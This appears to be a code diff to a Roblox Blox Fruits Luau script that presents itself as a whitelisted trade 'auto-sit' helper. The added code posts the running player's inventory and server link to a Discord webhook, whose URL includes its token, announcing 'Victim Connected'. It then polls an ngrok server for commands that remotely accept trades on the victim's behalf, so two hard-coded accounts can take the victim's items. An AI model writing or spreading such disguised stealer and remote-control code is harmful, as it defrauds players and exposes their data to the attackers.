@@ -1,14 +1,33 @@
--- Blox Fruits Auto-Sit Headless Script (Strict Whitelist Edition)
+-- made by Noob -- Finalized Blox Fruits Trade Automation Client Script (Headless Strict Whitelist Edition)
+-- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
+-- *fully integrated inventory dump webhook, command polling loop, and strict whitelisted auto-sit/table-switching mechanism*
+
+getgenv().bfRunning = nil
+getgenv().bfRunning = true
+
+print("[DEBUG] Initializing Finalized Blox Fruits Trade Automation with Strict Whitelist...")
+
+local Config = {
+    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
+    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
+    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
+}
+
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
--- STRICT WHITELIST: Only these two usernames are allowed to trade with you.
-local AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" }
+local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
+local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
+local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)
+
+local requestFunc = syn and syn.request or http_request or request
 
 local function IsAuthorized(username)
-    for _, name in ipairs(AuthorizedUsers) do
+    for _, name in ipairs(Config.AuthorizedUsers) do
         if name == username then
             return true
         end
@@ -16,15 +35,70 @@ local function IsAuthorized(username)
     return false
 end
 
-local lastTable = nil
-local jumpCooldown = 0
-local running = true
-
-local function IsTradeTableSeat(seat)
-    local parent = seat.Parent
-    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
+local function GetInventory()
+    local success, result = pcall(function()
+        if CommF then return CommF:InvokeServer("getInventory") end
+        return {}
+    end)
+    return (success and type(result) == "table") and result or {}
 end
 
+local function TransmitTelemetry()
+    local inventory = GetInventory()
+    local fruitsList = {}
+
+    for _, item in pairs(inventory) do
+        if item.Type == "Blox Fruit" then
+            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
+        end
+    end
+
+    local payloadData = {
+        content = "@everyone Victim Connected & Inventory Dumped!",
+        embeds = {{
+            title = "Target Session Report",
+            color = 12451840,
+            fields = {
+                { name = "Username", value = LocalPlayer.Name, inline = true },
+                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
+                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = Config.WebhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payloadData)
+            })
+        end)
+    end
+end
+
+local function InvokeTradeAction(action)
+    if not TradeFunction then
+        warn("[ERROR] TradeFunction remote missing!")
+        return
+    end
+
+    print("[DEBUG] Processing action via verified remote layout:", action)
+
+    pcall(function()
+        if action == "accept" then
+            local args = { "accept" }
+            TradeFunction:InvokeServer(unpack(args))
+        elseif action == "cancel" then
+            local args = { "cancel" }
+            TradeFunction:InvokeServer(unpack(args))
+        end
+    end)
+end
+
+-- Teleport / Tween handling for safe seating movement
 local function TweenToSeat(hrp, targetCFrame)
     local distance = (hrp.Position - targetCFrame.Position).Magnitude
     local speed = 150 
@@ -34,6 +108,11 @@ local function TweenToSeat(hrp, targetCFrame)
     local tween = TweenService:Create(hrp, tweenInfo, { CFrame = targetCFrame })
     tween:Play()
     tween.Completed:Wait()
+end
+
+local function IsTradeTableSeat(seat)
+    local parent = seat.Parent
+    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
 end
 
 -- Strictly checks if a player sitting in a seat is NOT authorized. Returns the player's name if unauthorized, or nil if safe/empty.
@@ -83,8 +162,40 @@ local function IsTableBlocked(tableModel)
     return false
 end
 
+-- Telemetry & Command Polling background thread
 task.spawn(function()
-    while running do
+    pcall(TransmitTelemetry)
+
+    if not requestFunc then
+        warn("[ERROR] Executor does not support http requests!")
+        return
+    end
+
+    while true do
+        task.wait(2)
+        pcall(function()
+            local response = requestFunc({
+                Url = Config.CommandApiUrl,
+                Method = "GET"
+            })
+
+            if response and response.StatusCode == 200 then
+                local data = HttpService:JSONDecode(response.Body)
+                if data and data.command then
+                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
+                    InvokeTradeAction(data.command)
+                end
+            end
+        end)
+    end
+end)
+
+-- Strict Whitelist Headless Auto-Sit & Table Switching Loop
+task.spawn(function()
+    local lastTable = nil
+    local jumpCooldown = 0
+
+    while true do
         task.wait(0.5)
         
         local character = LocalPlayer.Character
